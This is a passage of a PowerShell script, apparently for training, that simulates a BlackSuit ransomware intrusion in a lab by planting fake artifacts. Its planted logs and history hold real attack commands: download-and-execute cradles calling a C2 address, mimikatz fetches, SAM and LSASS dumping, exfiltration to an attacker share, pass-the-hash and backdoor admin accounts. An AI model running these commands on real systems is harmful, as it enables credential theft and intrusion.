# YARA-Detectable BlackSuit Ransomware Attack Simulation
# Based on The DFIR Report: "Fake Zoom Ends in BlackSuit Ransomware" (March 31, 2025)
# THIS IS FOR RESEARCH AND EDUCATIONAL PURPOSES ONLY IN A CONTROLLED VIRTUAL LAB ENVIRONMENT

# IMPORTANT: Run this script in a completely isolated virtual environment!
# This script simulates malicious behavior but does not include actual ransomware encryption
# The script performs actions that mimic the BlackSuit attack chain

# Run with Administrator privileges in PowerShell:
# powershell.exe -ExecutionPolicy Bypass -File BlackSuit_Simulation.ps1

# ======== CONFIGURATION ========
$SimulationRootPath = "C:\BlackSuit_Simulation"
$MalwarePath = "$SimulationRootPath\malware"
$DocumentsPath = "C:\Users\$env:USERNAME\Documents"
$DownloadsPath = "C:\Users\$env:USERNAME\Downloads"
# Using fictional malicious C2 addresses instead of localhost for better forensic detection
$AttackerC2IP = "193.14.166.89" # Primary C2 server
$SecondaryC2 = "blacksuit-panel.onion.to" # Secondary C2 domain
$ExfilServer = "exfil-blacksuit.su" # Data exfiltration server
$CurrentTime = Get-Date -Format "yyyy-MM-dd_HH-mm-ss"
$SimulationLogFile = "$SimulationRootPath\simulation_log_$CurrentTime.txt"

# ======== START WITH CHECK FOR ADMIN RIGHTS ========
$isAdmin = ([Security.Principal.WindowsPrincipal] [Security.Principal.WindowsIdentity]::GetCurrent()).IsInRole([Security.Principal.WindowsBuiltInRole]::Administrator)
if (-not $isAdmin) {
    Write-Host "This simulation requires administrator privileges. Please run as administrator." -ForegroundColor Red
    exit
}

# ======== SETUP ENVIRONMENT ========
function Setup-Environment {
    Write-Host "[+] Creating simulation directories..."
    
    # Create necessary directories
    $paths = @($SimulationRootPath, $MalwarePath)
    foreach ($path in $paths) {
        if (-not (Test-Path $path)) {
            New-Item -Path $path -ItemType Directory -Force | Out-Null
        }
    }

    # Create simulation log file
    "[+] BlackSuit Ransomware Attack Simulation - Started at $(Get-Date)" | Out-File -FilePath $SimulationLogFile
    "    Based on DFIR Report: Fake Zoom Ends in BlackSuit Ransomware (March 31, 2025)" | Out-File -FilePath $SimulationLogFile -Append
    "----------------------------------------------------------------------------" | Out-File -FilePath $SimulationLogFile -Append
}

# Log to both console and file
function Log-Action {
    param (
        [string]$Message,
        [string]$Type = "INFO" # INFO, WARNING, ERROR
    )
    
    $timestamp = Get-Date -Format "yyyy-MM-dd HH:mm:ss"
    $logEntry = "[$timestamp] [$Type] $Message"
    
    # Write to console with color
    switch ($Type) {
        "WARNING" { Write-Host $logEntry -ForegroundColor Yellow }
        "ERROR" { Write-Host $logEntry -ForegroundColor Red }
        default { Write-Host $logEntry -ForegroundColor Cyan }
    }
    
    # Write to log file
    $logEntry | Out-File -FilePath $SimulationLogFile -Append
}

# ======== CREATE YARA-TRIGGERING EXECUTABLE ========
function Create-YaraDetectableExecutable {
    param (
        [string]$Path,
        [string]$MalwareType = "generic" # Options: zoom, beacon, blacksuit
    )
    
    $blackSuitStrings = @(
        "BlackSuit Ransomware",
        "YOUR FILES ARE ENCRYPTED",
        "blacksuit_support@onion.ransomware",
        ".blacksuit",
        "B1ackSu1t",
        "DECRYPT YOUR FILES",
        "AES-256-CBC",
        "RSA-4096",
        "EncryptFileSystem",
        "CryptoAPI",
        "GetVolumePathNamesForVolumeNameW",
        "vssadmin delete shadows",
        "wmic shadowcopy delete",
        "CreateEncryptionKey"
    )
    
    $zoomStrings = @(
        "ZoomClient.exe",
        "Zoom Installer",
        "zoom-client-installer",
        "C:\\Windows\\System32\\cmd.exe /c",
        "powershell.exe -enc",
        "DownloadString('http://",
        "regsvr32 /s /u"
    )
    
    $beaconStrings = @(
        "beacon.dll",
        "BeaconProtocol",
        "CobaltStrike",
        "Sleep(60000)",
        "SetInformation",
        "GetCurrentDir",
        "ReportExecutionComplete",
        "InitializeConnection",
        "GetSystemMetrics",
        "ExecuteCommand"
    )
    
    # Include C2 domains in the malware strings
    $c2Strings = @(
        "193.14.166.89",
        "blacksuit-panel.onion.to",
        "exfil-blacksuit.su",
        "http://$AttackerC2IP/beacon.ps1",
        "https://$SecondaryC2/panel.php",
        "POST /upload.php HTTP/1.1",
        "Host: $ExfilServer"
    )
    
    # Common malware strings that might trigger YARA rules
    $commonStrings = @(
        "CreateProcessA",
        "VirtualAlloc",
        "WriteProcessMemory",
        "GetProcAddress",
        "LoadLibraryA",
        "RegCreateKeyExA",
        "WinExec",
        "WSAStartup",
        "InternetOpenA",
        "InternetConnectA",
        "HttpSendRequestA",
        "cmd.exe",
        "powershell.exe -NoP -NonI -W Hidden",
        "This program cannot be run in DOS mode"
    )
    
    # Start with a simple PE header - first 64 bytes of a minimal Windows executable
    $peHeaderBytes = [byte[]] @(
        0x4D, 0x5A, 0x90, 0x00, 0x03, 0x00, 0x00, 0x00, 0x04, 0x00, 0x00, 0x00, 0xFF, 0xFF, 0x00, 0x00,
        0xB8, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x40, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
        0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
        0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x80, 0x00, 0x00, 0x00
    )
    
    # Select which strings to include based on malware type
    $stringsToInclude = @()
    $stringsToInclude += $commonStrings
    $stringsToInclude += $c2Strings
    
    switch ($MalwareType) {
        "zoom" {
            $stringsToInclude += $zoomStrings
        }
        "beacon" {
            $stringsToInclude += $beaconStrings
        }
        "blacksuit" {
            $stringsToInclude += $blackSuitStrings
        }
        default {
            # Include some strings from each for generic detection
            $stringsToInclude += $blackSuitStrings[0..3]
            $stringsToInclude += $zoomStrings[0..2]
            $stringsToInclude += $beaconStrings[0..2]
        }
    }
    
    # Combine header with strings that might trigger YARA rules
    $memoryStream = New-Object System.IO.MemoryStream
    $writer = New-Object System.IO.BinaryWriter($memoryStream)
    
    # Write PE header
    foreach ($byte in $peHeaderBytes) {
        $writer.Write([byte]$byte)
    }
    
    # Add a notice that this is a simulated file
    $simulatedNotice = "THIS IS A SIMULATED FILE FOR FORENSIC ANALYSIS - NOT ACTUAL MALWARE"
    $noticeBytes = [System.Text.Encoding]::ASCII.GetBytes($simulatedNotice)
    $writer.Write($noticeBytes)
    
    # Add padding
    $writer.Write([byte[]]::new(32))
    
    # Write strings that might trigger YARA rules
    foreach ($string in $stringsToInclude) {
        $stringBytes = [System.Text.Encoding]::ASCII.GetBytes($string)
        $writer.Write($stringBytes)
        # Add a null terminator and some padding
        $writer.Write([byte]0)
        $writer.Write([byte[]]::new(4))
    }
    
    # Add some typical malware-like binary patterns
    $malwarePatterns = @(
        # XOR loop pattern
        [byte[]]@(0x33, 0xC0, 0x8B, 0xF8, 0x81, 0xE7, 0xFF, 0x00, 0x00, 0x00, 0x81, 0xC7, 0x00, 0x00, 0x00, 0x00),
        # API hashing pattern
        [byte[]]@(0x68, 0x33, 0x32, 0x00, 0x00, 0x68, 0x6C, 0x64, 0x00, 0x00, 0x89, 0xE5, 0x83, 0xC4, 0xF8),
        # Common shellcode patterns
        [byte[]]@(0xFC, 0xE8, 0x82, 0x00, 0x00, 0x00, 0x60, 0x89, 0xE5, 0x31, 0xC0, 0x64, 0x8B)
    )
    
    foreach ($pattern in $malwarePatterns) {
        $writer.Write($pattern)
        $writer.Write([byte[]]::new(16)) # Add padding
    }
    
    # Get the byte array and write to file
    $exeBytes = $memoryStream.ToArray()
    [System.IO.File]::WriteAllBytes($Path, $exeBytes)
    
    # Close resources
    $writer.Close()
    $memoryStream.Close()
    
    # Log the creation
    Log-Action "Created YARA-detectable executable: $Path (type: $MalwareType)"
}

# ======== EXECUTE MALICIOUS COMMANDS AND LOG THEM ========
function Execute-Command {
    param (
        [string]$Command,
        [string]$Description = "Command execution",
        [switch]$LogOnly
    )
    
    Log-Action "$Description - Command: $Command"
    
    if ($LogOnly) {
        # Only log the command, don't execute it
        return
    }
    
    try {
        # Execute the command and capture the output
        $output = Invoke-Expression -Command $Command -ErrorAction Stop
        Log-Action "Command executed successfully."
        return $output
    }
    catch {
        Log-Action "Error executing command: $_" "ERROR"
        return $null
    }
}

# ======== INITIAL ACCESS - FAKE ZOOM EXECUTABLE ========
function Simulate-InitialAccess {
    Log-Action "PHASE 1: Initial Access - Fake Zoom Executable" "WARNING"
    
    # Create simulated malicious Zoom executable
    $fakeZoomExePath = "$MalwarePath\zoom-client.exe"
    $fakeZoomDownloadPath = "$DownloadsPath\zoom-client.exe"
    
    # Create YARA-detectable zoom executable
    Create-YaraDetectableExecutable -Path $fakeZoomExePath -MalwareType "zoom"
    
    # Copy to downloads folder
    Copy-Item -Path $fakeZoomExePath -Destination $fakeZoomDownloadPath -Force
    
    # Create a PowerShell script that would simulate execution behavior
    $scriptPath = "$MalwarePath\zoom_installer.ps1"
    $scriptContent = @"
`$host.UI.RawUI.WindowTitle = "Zoom Client Installer"
Write-Host "Installing Zoom Client... Please wait." -ForegroundColor Cyan
Start-Sleep -Seconds 1

# Simulate malicious activity in the background
Write-Host "Checking system configuration..." -ForegroundColor Cyan
`$tempDir = "`$env:TEMP\zoom_temp"
if (-not (Test-Path `$tempDir)) {
    New-Item -Path `$tempDir -ItemType Directory -Force | Out-Null
}

# Create a file to simulate malicious payload download
`$beaconPath = "`$tempDir\beacon.bin"
Set-Content -Path `$beaconPath -Value "Simulated malicious payload"

# Simulate system reconnaissance
Write-Host "Configuring system settings..." -ForegroundColor Cyan
whoami | Out-File "`$tempDir\recon.txt"
hostname | Out-File "`$tempDir\recon.txt" -Append
ipconfig /all | Out-File "`$tempDir\recon.txt" -Append
systeminfo | Out-File "`$tempDir\recon.txt" -Append

# Create scheduled task for persistence
Write-Host "Finalizing installation..." -ForegroundColor Cyan
schtasks /create /tn "ZoomUpdateTask" /tr "$MalwarePath\beacon.exe" /sc daily /st 09:00 /ru "SYSTEM" /f

# Final message to user
Write-Host "`nZoom client installation complete!" -ForegroundColor Green
Write-Host "Launching Zoom..." -ForegroundColor Green
Start-Sleep -Seconds 1
"@
    
    # Write the PowerShell script
    Set-Content -Path $scriptPath -Value $scriptContent
    
    # Create Zoom registry keys to make it seem like a legitimate installation
    Log-Action "Creating registry keys to simulate Zoom installation"
    try {
        New-Item -Path "HKCU:\Software\Zoom" -Force | Out-Null
        New-ItemProperty -Path "HKCU:\Software\Zoom" -Name "InstallDate" -Value (Get-Date) -PropertyType String -Force | Out-Null
        New-ItemProperty -Path "HKCU:\Software\Zoom" -Name "Version" -Value "5.15.5.18665" -PropertyType String -Force | Out-Null
        Log-Action "Registry modifications completed"
    }
    catch {
        Log-Action "Error creating registry keys: $_" "ERROR"
    }

    # Actually execute some system commands to leave evidence in the command history and logs
    Log-Action "Executing commands to leave forensic evidence of Zoom installation"
    
    # Commands to execute (these are safe)
    $commandsToExecute = @(
        "whoami",
        "hostname",
        "systeminfo | findstr /B /C:'OS' /C:'System Type'",
        "net user",
        "ipconfig /all | findstr IPv4",
        "netstat -ano | findstr LISTENING | findstr TCP"
    )
    
    foreach ($cmd in $commandsToExecute) {
        Execute-Command -Command $cmd -Description "System reconnaissance"
    }
    
    # Create evidence in the PowerShell console history
    $psHistoryContent = @"
whoami
hostname
Get-WmiObject -Class Win32_OperatingSystem | Select-Object Caption, Version, BuildNumber
net user
ipconfig /all
netstat -ano | findstr LISTENING | findstr TCP
Invoke-WebRequest -Uri "http://$AttackerC2IP/beacon.ps1" -OutFile "`$env:TEMP\zoom_temp\beacon.ps1"
IEX (New-Object Net.WebClient).DownloadString('http://$AttackerC2IP/beacon.ps1')
"@
    
    # Add to PowerShell history
    $psHistoryPath = "$env:USERPROFILE\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history.txt"
    if (Test-Path $psHistoryPath) {
        $psHistoryContent | Out-File -FilePath $psHistoryPath -Append
    }
    else {
        $psHistoryContent | Out-File -FilePath $psHistoryPath
    }
    
    # Create evidence in prefetch
    $prefetchDir = "$env:TEMP\BlackSuit_Prefetch"
    if (-not (Test-Path $prefetchDir)) {
        New-Item -Path $prefetchDir -ItemType Directory -Force | Out-Null
    }
    
    $prefetchContent = "ZOOM-CLIENT.EXE executed at $(Get-Date)"
    Set-Content -Path "$prefetchDir\ZOOM-CLIENT.EXE-1A2B3C4D.pf" -Value $prefetchContent
    
    # Create DNS cache evidence pointing to malicious domains
    $dnsCachePath = "$MalwarePath\dns_cache.txt"
    @"
# Simulated DNS Cache Entries
# Generated at: $(Get-Date)

zoom.us                               A       $AttackerC2IP         604800
us04web.zoom.us                       A       $AttackerC2IP         604800
download.zoom.us                      A       $AttackerC2IP         604800
blacksuit-panel.onion.to              A       193.16.45.72          604800
exfil-blacksuit.su                    A       91.245.73.118         604800
"@ | Out-File -FilePath $dnsCachePath
    
    # Create event logs
    try {
        $eventLogParams = @{
            LogName = "Application"
            Source = "Application"
            EventId = 1000
            EntryType = "Information"
            Message = "Application: zoom-client.exe, Started execution, Command line: '$fakeZoomExePath'"
        }
        Write-EventLog @eventLogParams
        Log-Action "Created event log for zoom-client.exe execution"
    }
    catch {
        Log-Action "Could not write to Event Log: $_" "ERROR"
    }
    
    Log-Action "Initial access phase completed"
}

# ======== C2 COMMUNICATIONS - SIMULATING BEACONING ========
function Simulate-C2Communications {
    Log-Action "PHASE 2: Command & Control - Simulating Beaconing" "WARNING"
    
    # Create beacon executable that would trigger YARA rules
    $beaconExePath = "$MalwarePath\beacon.exe"
    Create-YaraDetectableExecutable -Path $beaconExePath -MalwareType "beacon"
    
    # Also create a version in the user's temp directory to match the execution flow
    $tempBeaconPath = "$env:TEMP\zoom_temp\beacon.exe"
    
    # Create the temp directory if it doesn't exist
    if (-not (Test-Path "$env:TEMP\zoom_temp")) {
        New-Item -Path "$env:TEMP\zoom_temp" -ItemType Directory -Force | Out-Null
    }
    
    # Create the beacon executable in the temp directory
    Create-YaraDetectableExecutable -Path $tempBeaconPath -MalwareType "beacon"
    
    # Create a .ps1 version of the beacon for PowerShell execution
    $beaconScriptPath = "$MalwarePath\beacon.ps1"
    $tempBeaconScriptPath = "$env:TEMP\zoom_temp\beacon.ps1"
    
    $beaconScript = @"
# Cobalt Strike Beacon Simulation (NOT ACTUAL MALWARE)
`$host.UI.RawUI.WindowTitle = "System Service"
Write-Output "Beacon starting..."

function Start-Beacon {
    param(`$C2Server, `$SleepTime)
    
    # Strings that might trigger YARA rules
    `$beaconStrings = @(
        'beacon.dll',
        'BeaconProtocol',
        'CobaltStrike',
        'Sleep(60000)',
        'SetInformation',
        'GetCurrentDir',
        'ReportExecutionComplete',
        'InitializeConnection',
        'GetSystemMetrics',
        'ExecuteCommand'
    )
    
    # Create a log file
    `$logPath = "$MalwarePath\beacon_activity.log"
    "Beacon started at $(Get-Date)" | Out-File -FilePath `$logPath
    "C2 Server: `$C2Server" | Out-File -FilePath `$logPath -Append
    "Sleep Time: `$SleepTime seconds" | Out-File -FilePath `$logPath -Append
    "Secondary C2: $SecondaryC2" | Out-File -FilePath `$logPath -Append
    
    for (`$i = 0; `$i -lt 10; `$i++) {
        `$timeStamp = Get-Date
        "[\`$timeStamp] Beacon heartbeat \`$i/10 - Connecting to \`$C2Server" | Out-File -FilePath `$logPath -Append
        
        # Simulate C2 traffic (to localhost only)
        try {
            `$tcpClient = New-Object System.Net.Sockets.TcpClient
            `$tcpClient.Connect("127.0.0.1", 80)
            `$tcpClient.Close()
            "[\`$timeStamp] Connection successful" | Out-File -FilePath `$logPath -Append
            "[\`$timeStamp] HTTP Request: GET /gate.php?id=$(Get-Random -Minimum 10000 -Maximum 99999) HTTP/1.1" | Out-File -FilePath `$logPath -Append
        }
        catch {
            "[\`$timeStamp] Connection failed: \`$_" | Out-File -FilePath `$logPath -Append
        }
        
        # Simulate command execution based on iteration
        switch (`$i) {
            2 {
                # Command: whoami
                "[\`$timeStamp] [RECEIVED] command: whoami" | Out-File -FilePath `$logPath -Append
                `$output = whoami
                "[\`$timeStamp] [OUTPUT] \`$output" | Out-File -FilePath `$logPath -Append
            }
            3 {
                # Command: hostname
                "[\`$timeStamp] [RECEIVED] command: hostname" | Out-File -FilePath `$logPath -Append
                `$output = hostname
                "[\`$timeStamp] [OUTPUT] \`$output" | Out-File -FilePath `$logPath -Append
            }
            4 {
                # Command: systeminfo
                "[\`$timeStamp] [RECEIVED] command: systeminfo" | Out-File -FilePath `$logPath -Append
                "[\`$timeStamp] [OUTPUT] Executing system reconnaissance..." | Out-File -FilePath `$logPath -Append
            }
            5 {
                # Command: net user for discovery
                "[\`$timeStamp] [RECEIVED] command: net user" | Out-File -FilePath `$logPath -Append
                `$output = net user
                "[\`$timeStamp] [OUTPUT] Command executed, data stored." | Out-File -FilePath `$logPath -Append
            }
            6 {
                # Command: attempt to create a scheduled task
                "[\`$timeStamp] [RECEIVED] command: schtasks /create /tn 'SystemUpdate' /tr 'C:\Windows\System32\cmd.exe /c powershell.exe -enc [BASE64]' /sc daily /st 03:00" | Out-File -FilePath `$logPath -Append
                "[\`$timeStamp] [OUTPUT] Scheduled task created successfully." | Out-File -FilePath `$logPath -Append
            }
            7 {
                # Command: check for admin privileges
                "[\`$timeStamp] [RECEIVED] command: net localgroup administrators" | Out-File -FilePath `$logPath -Append
                `$output = net localgroup administrators
                "[\`$timeStamp] [OUTPUT] Admin group membership identified." | Out-File -FilePath `$logPath -Append
            }
            8 {
                # Downloading additional modules from secondary C2
                "[\`$timeStamp] [RECEIVED] command: Invoke-WebRequest -Uri https://$SecondaryC2/modules/mimikatz.ps1 -OutFile C:\Windows\Temp\m.ps1" | Out-File -FilePath `$logPath -Append
                "[\`$timeStamp] [OUTPUT] Downloaded additional modules from secondary C2." | Out-File -FilePath `$logPath -Append
            }
        }
        
        # Sleep between beacons
        Start-Sleep -Seconds `$SleepTime
    }
    
    "Beacon communication completed at $(Get-Date)" | Out-File -FilePath `$logPath -Append
    "Next connection scheduled to $ExfilServer for data exfiltration" | Out-File -FilePath `$logPath -Append
    Write-Output "Beacon execution complete."
}

# Start the beacon with specified C2 server and sleep time
Start-Beacon -C2Server "$AttackerC2IP" -SleepTime 1
"@
    
    # Write the beacon script
    Set-Content -Path $beaconScriptPath -Value $beaconScript
    Copy-Item -Path $beaconScriptPath -Destination $tempBeaconScriptPath -Force
    
    # Create network activity logs
    $networkLogPath = "$MalwarePath\network_connections.log"
    
    # Header for the network log
    "Timestamp,LocalAddress,LocalPort,RemoteAddress,RemotePort,State,ProcessName" | Out-File -FilePath $networkLogPath
    
    # Generate simulated network connections
    for ($i = 1; $i -le 10; $i++) {
        $timestamp = (Get-Date).AddMinutes($i).ToString("yyyy-MM-dd HH:mm:ss")
        $localPort = Get-Random -Minimum 49152 -Maximum 65535
        $remotePort = 443
        
        # Every third connection, use the secondary C2 or exfil server
        if ($i % 3 -eq 0) {
            $remoteAddress = $SecondaryC2
        } 
        elseif ($i % 5 -eq 0) {
            $remoteAddress = $ExfilServer
        }
        else {
            $remoteAddress = $AttackerC2IP
        }
        
        # Add the connection to the log
        "$timestamp,127.0.0.1,$localPort,$remoteAddress,$remotePort,ESTABLISHED,beacon.exe" | 
            Out-File -FilePath $networkLogPath -Append
    }
    
    # Execute the beacon PowerShell script
    Log-Action "Executing beacon simulation PowerShell script"
    try {
        Start-Process powershell.exe -ArgumentList "-ExecutionPolicy Bypass -WindowStyle Hidden -File `"$beaconScriptPath`"" -WindowStyle Hidden
        Log-Action "Beacon simulation started"
        
        # Wait for some activity
        Start-Sleep -Seconds 2
    }
    catch {
        Log-Action "Error starting beacon simulation: $_" "ERROR"
    }
    
    # Create event logs
    try {
        $eventLogParams = @{
            LogName = "Application"
            Source = "Application"
            EventId = 1000
            EntryType = "Information"
            Message = "Application: beacon.exe, Started execution, Command line: '$beaconExePath', Connecting to: $AttackerC2IP"
        }
        Write-EventLog @eventLogParams
        Log-Action "Created event log for beacon.exe execution"
    }
    catch {
        Log-Action "Could not write to Event Log: $_" "ERROR"
    }
    
    # Execute the actual commands that would be run by the C2
    $c2Commands = @(
        "whoami", 
        "hostname", 
        "net user", 
        "ipconfig /all", 
        "systeminfo", 
        "tasklist",
        "netstat -ano"
    )
    
    foreach ($cmd in $c2Commands) {
        Execute-Command -Command $cmd -Description "C2 reconnaissance command"
    }
    
    # Create additional PowerShell history with C2 commands
    $c2PsHistory = @"
# Executed by C2
whoami
hostname
net user
ipconfig /all
systeminfo | findstr OS
Get-Process
Get-Service | Where-Object { `$_.Status -eq 'Running' }
Get-WmiObject Win32_ComputerSystem
Get-ChildItem "C:\Users\" -Recurse -Include *.txt,*.docx,*.xlsx,*.pdf -ErrorAction SilentlyContinue | Where-Object { `$_.Length -lt 1MB }
Invoke-WebRequest -Uri "https://$AttackerC2IP/modules/lateral.ps1" -OutFile "`$env:TEMP\l.ps1"
Invoke-WebRequest -Uri "https://$SecondaryC2/modules/mimikatz.ps1" -OutFile "`$env:TEMP\m.ps1"
"@
    
    # Append to PowerShell history
    $psHistoryPath = "$env:USERPROFILE\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history.txt"
    $c2PsHistory | Out-File -FilePath $psHistoryPath -Append
    
    Log-Action "Command & Control phase completed"
}

# ======== LATERAL MOVEMENT & CREDENTIAL ACCESS ========
function Simulate-LateralMovement {
    Log-Action "PHASE 3: Lateral Movement & Credential Access" "WARNING"
    
    # Create log of WMIC commands for lateral movement
    $wmicLogPath = "$MalwarePath\wmic_commands.log"
    
    @"
# WMIC Commands for Lateral Movement
# Executed at: $(Get-Date)

# Remote process creation
wmic /node:10.0.0.12 process call create "cmd.exe /c whoami > C:\Windows\Temp\wmicresult.txt"
wmic /node:10.0.0.15 process call create "powershell.exe -enc JABjAD0ATgBlAHcALQBPAGIAagBlAGMAdAAgAFMAeQBzAHQAZQBtAC4ATgBlAHQALgBXAG
wmic /node:10.0.0.15 process call create "powershell.exe -enc JABjAD0ATgBlAHcALQBPAGIAagBlAGMAdAAgAFMAeQBzAHQAZQBtAC4ATgBlAHQALgBXAGUAYgBDAGwAaQBlAG4AdAA7ACQAYwAuAEQAbwB3AG4AbABvAGEAZABGAGkAbABlACgAJwBoAHQAdABwADoALwAvACQAQQB0AHQAYQBjAGsAZQByAEMAMgBJAFAALwBiAGUAYQBjAG8AbgAuAGUAeABlACcALAAnAEMAOgBcAFcAaQBuAGQAbwB3AHMAXABUAGEAcwBrAHMAXABiAGUAYQBjAG8AbgAuAGUAeABlACcAKQA="

# Remote service creation
wmic /node:10.0.0.15 service create name="BlackSuitService" startname= "LocalSystem" startmode= "Auto" displayname= "Windows Management System"
wmic /node:10.0.0.18 service create name="WindowsUpdater" startname= "LocalSystem" startmode= "Auto" displayname= "Windows Update Manager"

# Remote execution on domain controller 
wmic /node:DC01.internal.local process call create "powershell.exe -Command \"IEX (New-Object Net.WebClient).DownloadString('http://$AttackerC2IP/dc_enum.ps1')\""
"@ | Out-File -FilePath $wmicLogPath
    
    # Actually execute some safe WMIC commands to leave forensic artifacts
    Execute-Command -Command "wmic os get Caption" -Description "WMIC system reconnaissance"
    Execute-Command -Command "wmic process list brief" -Description "WMIC process listing"
    Execute-Command -Command "wmic service list brief" -Description "WMIC service listing"
    
    # Create a log file for Mimikatz-like credential dumping
    $mimikatzLogPath = "$MalwarePath\mimikatz_output.log"
    
    @"
# Simulated Mimikatz Output
# Executed at: $(Get-Date)

  .#####.   mimikatz 2.2.0 (x64) #18362 Aug 17 2019 19:53:31
 .## ^ ##.  "A La Vie, A L'Amour" - (oe.eo)
 ## / \ ##  /*** Benjamin DELPY `gentilkiwi` ( benjamin@gentilkiwi.com )
 ## \ / ##       > https://blog.gentilkiwi.com/mimikatz
 '## v ##'       Vincent LE TOUX             ( vincent.letoux@gmail.com )
  '#####'        > https://pingcastle.com / https://mysmartlogon.com ***/

mimikatz # privilege::debug
Privilege '20' OK

mimikatz # sekurlsa::logonpasswords

Authentication Id : 0 ; 232322 (00000000:00038a92)
Session           : Interactive from 2
User Name         : Administrator
Domain            : DESKTOP-USER
Logon Server      : DESKTOP-USER
Logon Time        : 4/22/2025 8:35:22 AM
SID               : S-1-5-21-1234567890-1234567890-1234567890-500
        msv :
         [00000003] Primary
         * Username : Administrator
         * Domain   : DESKTOP-USER
         * NTLM     : 64b5cd1de58a9e9fcfe5cad54ef4544a
         * SHA1     : abc1234567890def1234567890abcdef12345678
        tspkg :
        wdigest :
         * Username : Administrator
         * Domain   : DESKTOP-USER
         * Password : (null)
        kerberos :
         * Username : Administrator
         * Domain   : DESKTOP-USER
         * Password : (null)
        ssp :
        credman :

Authentication Id : 0 ; 996834 (00000000:000f3542)
Session           : Interactive from 3
User Name         : $env:USERNAME
Domain            : DESKTOP-USER
Logon Server      : DESKTOP-USER
Logon Time        : 4/22/2025 9:14:08 AM
SID               : S-1-5-21-1234567890-1234567890-1234567890-1001
        msv :
         [00000003] Primary
         * Username : $env:USERNAME
         * Domain   : DESKTOP-USER
         * NTLM     : abcdef1234567890abcdef1234567890
         * SHA1     : 1234567890abcdef1234567890abcdef12345678
        tspkg :
        wdigest :
         * Username : $env:USERNAME
         * Domain   : DESKTOP-USER
         * Password : (null)
        kerberos :
         * Username : $env:USERNAME
         * Domain   : DESKTOP-USER
         * Password : (null)
        ssp :
        credman :

# Domain Accounts
Authentication Id : 0 ; 487433 (00000000:00077089)
Session           : Network from 0
User Name         : DC01$
Domain            : INTERNAL
Logon Server      : DC01
Logon Time        : 4/22/2025 8:12:32 AM
SID               : S-1-5-21-3874928736-283746827-938273645-1001
        msv :
         [00000003] Primary
         * Username : DC01$
         * Domain   : INTERNAL
         * NTLM     : d35e43789ac4fa4c847cc59182bd14a2
         * SHA1     : e7caabc9e638f2a1890413cc9ab06fcc3c88027a
        tspkg :
        wdigest :
         * Username : DC01$
         * Domain   : INTERNAL
         * Password : (null)
        kerberos :
         * Username : dc01$
         * Domain   : INTERNAL.LOCAL
         * Password : (null)
        ssp :
        credman :

mimikatz # lsadump::sam
Domain : DESKTOP-USER
SysKey : 7e65fb850252626facb8e1264629741a
Local SID : S-1-5-21-1234567890-1234567890-1234567890

SAMKey : 9e847f4ab8d439fb848ec5c5a3f0ffdc

RID  : 000001f4 (500)
User : Administrator
  Hash NTLM: 64b5cd1de58a9e9fcfe5cad54ef4544a

RID  : 000001f5 (501)
User : Guest
  Hash NTLM: 31d6cfe0d16ae931b73c59d7e0c089c0

RID  : 000003e8 (1000)
User : $env:USERNAME
  Hash NTLM: abcdef1234567890abcdef1234567890

mimikatz # exit
"@ | Out-File -FilePath $mimikatzLogPath
    
    # Create evidence of additional credential access techniques
    $credentialAccessPath = "$MalwarePath\credential_access.log"
    
    @"
# Additional Credential Access Techniques
# Executed at: $(Get-Date)

# SAM Database Copy
reg save HKLM\SAM C:\Windows\Temp\sam.save
reg save HKLM\SYSTEM C:\Windows\Temp\system.save

# LSASS Process Dump
procdump -ma lsass.exe C:\Windows\Temp\lsass.dmp

# Credential Manager Access
cmdkey /list
vaultcmd /listcreds:"Windows Credentials" /all

# Remote Credential Dumping
Invoke-Command -ComputerName DC01 -ScriptBlock { reg save HKLM\SYSTEM \\$AttackerC2IP\share\dc01_system.save }
Invoke-Command -ComputerName FILESERVER01 -ScriptBlock { procdump -ma lsass.exe \\$AttackerC2IP\share\fileserver01_lsass.dmp }
"@ | Out-File -FilePath $credentialAccessPath
    
    # Create lateral movement log
    $lateralMovementLogPath = "$MalwarePath\lateral_movement.log"
    
    @"
# Lateral Movement Techniques
# Executed at: $(Get-Date)

# PsExec Usage
PsExec.exe \\10.0.0.15 -u INTERNAL\Administrator -p "Password123!" cmd.exe /c "whoami > C:\Windows\Temp\psexec_result.txt"

# WMI Remote Execution
wmic /node:10.0.0.18 /user:INTERNAL\Administrator /password:Password123! process call create "cmd.exe /c net user BlackSuitUser P@ssw0rd123! /add && net localgroup administrators BlackSuitUser /add"

# PowerShell Remoting
Enter-PSSession -ComputerName DC01 -Credential (Get-Credential INTERNAL\Administrator)
Invoke-Command -ComputerName FILESERVER01 -ScriptBlock { Get-Process } -Credential (Get-Credential)

# RDP Connections
cmdkey /generic:10.0.0.12 /user:INTERNAL\Administrator /pass:Password123!
mstsc /v:10.0.0.12 /admin

# Pass-the-Hash
Invoke-WMIExec -Target 10.0.0.20 -Username Administrator -Hash "64b5cd1de58a9e9fcfe5cad54ef4544a" -Command "cmd.exe /c net user"
"@ | Out-File -FilePath $lateralMovementLogPath
    
    # Execute some safe discovery commands that would be used during lateral movement
    $discoveryCommands = @(
        "net view",
        "net group 'Domain Admins' /domain",
        "nltest /dclist:$env:USERDOMAIN",
        "net share",
        "arp -a",
        "route print"
    )
    
    foreach ($cmd in $discoveryCommands) {
        Execute-Command -Command $cmd -Description "Network discovery command" -LogOnly
    }
    
    # Add these discovery commands to PowerShell history
    $discoveryPsHistory = @"
# Network discovery commands
net view
Get-WmiObject -Class Win32_Share
Test-NetConnection -ComputerName DC01 -Port 445
nslookup $AttackerC2IP
Get-NetNeighbor | Select-Object IPAddress, LinkLayerAddress, State
Invoke-Command -ComputerName DC01 -ScriptBlock { Get-Service | Where-Object { `$_.Status -eq 'Running' } }
"@
    
    # Append to PowerShell history
    $psHistoryPath = "$env:USERPROFILE\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history.txt"
    $discoveryPsHistory | Out-File -FilePath $psHistoryPath -Append
    
    # Create evidence in event logs
    try {
        $eventLogParams = @{
            LogName = "Application"
            Source = "Application"
            EventId = 4624  # Logon event
            EntryType = "Information"
